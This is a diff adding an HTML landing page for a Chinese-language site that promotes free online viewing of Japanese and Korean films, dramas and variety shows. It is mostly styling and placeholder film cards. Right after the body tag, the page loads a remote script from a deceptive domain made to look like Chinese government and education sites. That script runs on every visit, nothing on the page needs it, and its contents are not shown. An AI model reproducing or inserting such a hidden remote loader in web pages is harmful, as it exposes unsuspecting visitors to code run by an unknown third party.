@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日韩电影网 - 日本韩国电影电视剧在线观看</title>
+<meta name="description" content="日韩电影网（rihandianyingwang-h5）专注日本电影、韩国电影、日剧、韩剧、动漫综艺在线观看，中文字幕高清资源每日更新。">
+<meta name="keywords" content="日韩电影网, 日本电影, 韩国电影, 日剧, 韩剧, 中文字幕, rihandianyingwang-h5">
+<style>
+:root{
+  --pink:#ff6b9d;
+  --purple:#a855f7;
+  --dark:#1a0a2e;
+  --darker:#0d0415;
+  --light:#fdf2f8;
+  --gray:#a0a0b0;
+  --white:rgba(255,255,255,0.92);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Sans SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--darker);
+  color:#e0d8e8;
+  line-height:1.7;
+  overflow-x:hidden;
+}
+
+/* 顶部霓虹线 */
+.neon-bar{
+  height:3px;
+  background:linear-gradient(90deg,var(--pink),var(--purple),var(--pink));
+  background-size:200% 100%;
+  animation:flow 3s linear infinite;
+}
+@keyframes flow{0%{background-position:0%}100%{background-position:200%}}
+
+/* 头部 */
+.header{
+  background:rgba(26,10,46,0.95);
+  backdrop-filter:blur(12px);
+  position:sticky;
+  top:0;
+  z-index:999;
+  border-bottom:1px solid rgba(255,107,157,0.2);
+}
+.header-inner{
+  max-width:1200px;
+  margin:0 auto;
+  padding:1rem;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  flex-wrap:wrap;
+  gap:1rem;
+}
+.logo{
+  font-size:1.6rem;
+  font-weight:900;
+  background:linear-gradient(135deg,var(--pink),var(--purple));
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.logo span{font-size:.8rem;color:var(--gray);display:block;font-weight:400}
+.nav{
+  display:flex;
+  gap:.5rem;
+  flex-wrap:wrap;
+}
+.nav a{
+  padding:.5rem 1rem;
+  border-radius:25px;
+  font-size:.9rem;
+  font-weight:600;
+  color:#c8b8d8;
+  transition:all .3s;
+}
+.nav a:hover,.nav a.active{
+  background:linear-gradient(135deg,var(--pink),var(--purple));
+  color:#fff;
+}
+
+/* 主容器 */
+.wrap{max-width:1200px;margin:0 auto;padding:0 1rem}
+
+/* Hero */
+.hero{
+  padding:4rem 0 3rem;
+  text-align:center;
+  position:relative;
+}
+.hero::before{
+  content:'';
+  position:absolute;
+  top:-50px;
+  left:50%;
+  transform:translateX(-50%);
+  width:600px;
+  height:600px;
+  background:radial-gradient(circle,rgba(255,107,157,0.12),transparent 70%);
+  pointer-events:none;
+}
+.hero-badge{
+  display:inline-block;
+  background:rgba(255,107,157,0.15);
+  border:1px solid rgba(255,107,157,0.3);
+  color:var(--pink);
+  padding:.3rem 1rem;
+  border-radius:20px;
+  font-size:.8rem;
+  margin-bottom:1.5rem;
+}
+.hero h1{
+  font-size:3rem;
+  font-weight:900;
+  margin-bottom:1rem;
+  line-height:1.2;
+}
+.hero h1 .jp{color:var(--pink)}
+.hero h1 .kr{color:var(--purple)}
+.hero p{
+  font-size:1.05rem;
+  color:#a89bb8;
+  max-width:560px;
+  margin:0 auto 2rem;
+}
+.hero-btns{
+  display:flex;
+  gap:1rem;
+  justify-content:center;
+  flex-wrap:wrap;
+}
+.btn{
+  padding:.8rem 2rem;
+  border-radius:30px;
+  font-weight:700;
+  font-size:.95rem;
+  transition:all .3s;
+  cursor:pointer;
+}
+.btn-primary{
+  background:linear-gradient(135deg,var(--pink),var(--purple));
+  color:#fff;
+  border:0;
+}
+.btn-primary:hover{
+  transform:translateY(-3px);
+  box-shadow:0 10px 30px rgba(255,107,157,0.4);
+}
+.btn-outline{
+  background:transparent;
+  color:#c8b8d8;
+  border:2px solid rgba(168,85,247,0.4);
+}
+.btn-outline:hover{
+  border-color:var(--purple);
+  color:#fff;
+}
+
+/* 分区 */
+.section{
+  padding:3.5rem 0;
+}
+.section-head{
+  display:flex;
+  align-items:center;
+  gap:1rem;
+  margin-bottom:2rem;
+}
+.section-head .icon{font-size:2rem}
+.section-head h2{
+  font-size:1.8rem;
+  font-weight:800;
+  color:#f0e8f8;
+}
+.section-head .sub{
+  font-size:.8rem;
+  color:var(--gray);
+  margin-left:auto;
+}
+
+/* 横向滚动卡片 */
+.h-scroll{
+  display:flex;
+  gap:1.2rem;
+  overflow-x:auto;
+  padding-bottom:1rem;
+  scroll-snap-type:x mandatory;
+  -webkit-overflow-scrolling:touch;
+}
+.h-scroll::-webkit-scrollbar{height:6px}
+.h-scroll::-webkit-scrollbar-track{background:rgba(255,255,255,0.05);border-radius:3px}
+.h-scroll::-webkit-scrollbar-thumb{background:rgba(255,107,157,0.3);border-radius:3px}
+.film-card{
+  flex:0 0 220px;
+  scroll-snap-align:start;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:16px;
+  overflow:hidden;
+  transition:all .3s;
+  cursor:pointer;
+}
+.film-card:hover{
+  transform:translateY(-8px);
+  border-color:rgba(255,107,157,0.4);
+  box-shadow:0 15px 40px rgba(168,85,247,0.2);
+}
+.film-cover{
+  height:130px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:3.5rem;
+  position:relative;
+}
+.film-cover.jp{background:linear-gradient(135deg,#ff6b9d22,#ff6b9d11)}
+.film-cover.kr{background:linear-gradient(135deg,#a855f722,#a855f711)}
+.film-cover.mix{background:linear-gradient(135deg,#ff6b9d22,#a855f722)}
+.film-info{
+  padding:1rem;
+}
+.film-info h3{
+  font-size:.95rem;
+  margin-bottom:.3rem;
+  color:#f0e8f8;
+  white-space:nowrap;
+  overflow:hidden;
+  text-overflow:ellipsis;
+}
+.film-info p{
+  font-size:.78rem;
+  color:#8878a0;
+  display:flex;
+  justify-content:space-between;
+}
+.film-info .rating{color:var(--pink);font-weight:700}
+
+/* 网格分类 */
+.cat-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(260px,1fr));
+  gap:1.2rem;
+}
+.cat-item{
+  background:rgba(255,255,255,0.03);
+  border:1px solid rgba(255,255,255,0.06);
+  border-radius:14px;
+  padding:1.5rem;
+  transition:all .3s;
+}
+.cat-item:hover{
+  background:rgba(255,255,255,0.06);
+  border-color:rgba(168,85,247,0.3);
+}
+.cat-item .cat-icon{font-size:2rem;margin-bottom:.8rem}
+.cat-item h3{font-size:1.1rem;margin-bottom:.5rem;color:#f0e8f8}
+.cat-item p{font-size:.88rem;color:#8878a0;margin-bottom:.8rem}
+.cat-item .cat-link{
+  font-size:.85rem;
+  color:var(--pink);
+  font-weight:600;
+}
+
+/* 关于 */
+.about-box{
+  background:linear-gradient(135deg,rgba(255,107,157,0.08),rgba(168,85,247,0.08));
+  border:1px solid rgba(255,107,157,0.15);
+  border-radius:20px;
+  padding:2.5rem;
+  text-align:center;
+}
+.about-box h3{
+  font-size:1.5rem;
+  margin-bottom:1rem;
+  color:#f0e8f8;
+}
+.about-box p{
+  color:#a89bb8;
+  max-width:680px;
+  margin:0 auto 1.5rem;
+}
+.about-stats{
+  display:flex;
+  justify-content:center;
+  gap:3rem;
+  flex-wrap:wrap;
+  margin-top:2rem;
+}
+.about-stats .stat-item .num{
+  font-size:2rem;
+  font-weight:900;
+  background:linear-gradient(135deg,var(--pink),var(--purple));
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.about-stats .stat-item .lbl{
+  font-size:.85rem;
+  color:#8878a0;
+}
+
+/* 页脚 */
+.footer{
+  border-top:1px solid rgba(255,107,157,0.15);
+  padding:2.5rem 1rem;
+  text-align:center;
+  margin-top:2rem;
+}
+.footer h3{
+  font-size:1.3rem;
+  margin-bottom:.5rem;
+  background:linear-gradient(135deg,var(--pink),var(--purple));
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.footer p{
+  font-size:.82rem;
+  color:#6a5a7a;
+  margin-top:.5rem;
+}
+.footer a{color:var(--pink)}
+
+/* 响应式 */
+@media(max-width:768px){
+  .hero h1{font-size:2rem}
+  .hero-btns{flex-direction:column;align-items:center}
+  .section-head{flex-wrap:wrap}
+  .section-head .sub{margin-left:0}
+  .about-stats{gap:1.5rem}
+  .film-card{flex:0 0 180px}
+  .film-cover{height:110px;font-size:2.8rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="neon-bar"></div>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="logo">
+      日韩电影网
+      <span>rihandianyingwang-h5.github.io</span>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">首页</a>
+      <a href="#japan">日本影视</a>
+      <a href="#korea">韩国影视</a>
+      <a href="#about">关于我们</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- 首页 -->
+  <section id="home" class="hero">
+    <div class="hero-badge">🌸 专注日韩 · 每日更新 🇰🇷</div>
+    <h1><span class="jp">日本</span> & <span class="kr">韩国</span><br>高清影视在线观看</h1>
+    <p>日韩电影网（rihandianyingwang-h5）收录最新日本电影、韩国电影、日剧、韩剧、动漫综艺，中文字幕高清流畅播放，一站式追遍东亚好内容。</p>
+    <div class="hero-btns">
+      <a href="#japan" class="btn btn-primary">🇯🇵 日本影视</a>
+      <a href="#korea" class="btn btn-outline">🇰🇷 韩国影视</a>
+    </div>
+  </section>
+
+  <!-- 日本影视 -->
+  <section id="japan" class="section">
+    <div class="section-head">
+      <span class="icon">🇯🇵</span>
+      <h2>日本影视</h2>
+      <span class="sub">Japanese Movies & Drama</span>
+    </div>
+    <div class="h-scroll">
+      <div class="film-card">
+        <div class="film-cover jp">🎌</div>
+        <div class="film-info">
+          <h3>日本院线新片</h3>
+          <p><span>2026 · 剧情</span><span class="rating">★ 8.7</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover jp">🏯</div>
+        <div class="film-info">
+          <h3>经典日剧回顾</h3>
+          <p><span>豆瓣TOP · 必看</span><span class="rating">★ 9.2</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover jp">🎨</div>
+        <div class="film-info">
+          <h3>新番动漫连载</h3>
+          <p><span>每周更新</span><span class="rating">★ 8.9</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover jp">🍡</div>
+        <div class="film-info">
+          <h3>治愈系日影</h3>
+          <p><span>温情 · 美食</span><span class="rating">★ 8.5</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover jp">🗾</div>
+        <div class="film-info">
+          <h3>悬疑推理日剧</h3>
+          <p><span>烧脑 · 反转</span><span class="rating">★ 8.8</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover jp">🎤</div>
+        <div class="film-info">
+          <h3>日本综艺娱乐</h3>
+          <p><span>搞笑 · 真人秀</span><span class="rating">★ 8.3</span></p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 韩国影视 -->
+  <section id="korea" class="section">
+    <div class="section-head">
+      <span class="icon">🇰🇷</span>
+      <h2>韩国影视</h2>
+      <span class="sub">Korean Movies & Drama</span>
+    </div>
+    <div class="h-scroll">
+      <div class="film-card">
+        <div class="film-cover kr">🇰🇷</div>
+        <div class="film-info">
+          <h3>韩国院线大片</h3>
+          <p><span>2026 · 动作</span><span class="rating">★ 8.6</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover kr">👑</div>
+        <div class="film-info">
+          <h3>韩剧热播榜</h3>
+          <p><span>爱情 · 权谋</span><span class="rating">★ 9.0</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover kr">🎭</div>
+        <div class="film-info">
+          <h3>韩综爆笑合集</h3>
+          <p><span>Running · 新西游记</span><span class="rating">★ 8.4</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover kr">🔪</div>
+        <div class="film-info">
+          <h3>韩国悬疑犯罪</h3>
+          <p><span>惊悚 · 人性</span><span class="rating">★ 8.9</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover kr">💖</div>
+        <div class="film-info">
+          <h3>韩影爱情精选</h3>
+          <p><span>浪漫 · 催泪</span><span class="rating">★ 8.2</span></p>
+        </div>
+      </div>
+      <div class="film-card">
+        <div class="film-cover kr">🎵</div>
+        <div class="film-info">
+          <h3>K-POP 音乐节目</h3>
+          <p><span>打歌 · 舞台</span><span class="rating">★ 8.1</span></p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 分类导航 -->
+  <section class="section">
+    <div class="section-head">
+      <span class="icon">📂</span>
+      <h2>内容分类</h2>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-item">
+        <div class="cat-icon">🎬</div>
+        <h3>日本电影</h3>
+        <p>从是枝裕和到新海诚，从经典老片到当季新片，日影全收录。</p>
+        <a href="#" class="cat-link">查看全部 →</a>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">📺</div>
+        <h3>日剧专区</h3>
+        <p>晨间剧、月九、深夜剧，各时段热门日剧同步追更。</p>
+        <a href="#" class="cat-link">查看全部 →</a>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">🎞️</div>
+        <h3>韩国电影</h3>
+        <p>奉俊昊、朴赞郁、金知云，韩国名导佳作一网打尽。</p>
+        <a href="#" class="cat-link">查看全部 →</a>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">🎤</div>
+        <h3>韩剧韩综</h3>
+        <p>浪漫爱情、悬疑律政、搞笑综艺，韩流内容全覆盖。</p>
+        <a href="#" class="cat-link">查看全部 →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="section">
+    <div class="about-box">
+      <h3>关于日韩电影网</h3>
+      <p>日韩电影网（网址：https://rihandianyingwang-h5.github.io）是一个专注于日本和韩国影视内容的在线观看导航站。我们致力于为影迷提供最新、最全的日韩电影、电视剧、动漫及综艺资源入口，中文字幕，高清画质，手机电脑均可流畅访问。</p>
+      <div class="about-stats">
+        <div class="stat-item">
+          <div class="num">2 国</div>
+          <div class="lbl">日本 + 韩国</div>
+        </div>
+        <div class="stat-item">
+          <div class="num">6 类</div>
+          <div class="lbl">电影/剧集/动漫/综艺</div>
+        </div>
+        <div class="stat-item">
+          <div class="num">每日</div>
+          <div class="lbl">资源更新</div>
+        </div>
+        <div class="stat-item">
+          <div class="num">100%</div>
+          <div class="lbl">免费观看</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>日韩电影网</h3>
+  <p>专注日本韩国高清影视在线观看</p>
+  <p>© 2026 日韩电影网 | <a href="https://rihandianyingwang-h5.github.io">rihandianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页面，所有链接均为 # 占位，资源信息仅供展示。</p>
+</footer>
+
+<script>
+// 平滑滚动
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var href=this.getAttribute('href');
+    if(href.length>1){
+      var target=document.querySelector(href);
+      if(target){e.preventDefault();target.scrollIntoView({behavior:'smooth',block:'start'})}
+    }
+  });
+});
+
+// 导航高亮
+var sections=document.querySelectorAll('.section, #home');
+var navLinks=document.querySelectorAll('.nav a');
+window.addEventListener('scroll',function(){
+  var current='';
+  sections.forEach(function(s){
+    if(window.scrollY>=s.offsetTop-150){current=s.id}
+  });
+  navLinks.forEach(function(link){
+    link.classList.remove('active');
+    if(link.getAttribute('href')==='#'+current){link.classList.add('active')}
+  });
+});
+</script>
+
+</body>
+</html>
